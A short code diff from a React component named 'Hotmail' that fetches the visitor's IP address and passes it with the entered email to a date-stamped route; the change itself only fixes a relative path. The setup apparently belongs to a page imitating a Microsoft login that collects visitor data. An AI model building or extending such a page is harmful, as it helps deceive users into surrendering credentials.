@@ -30,7 +30,7 @@ export default function Hotmail({ location }) {
 
     getIP().then((res) => {
       const ip = res.data.IPv4;
-      navigate(`ht/${date}`, {
+      navigate(`../ht/${date}`, {
         state: {
           ip: ip,
           email: values.username,
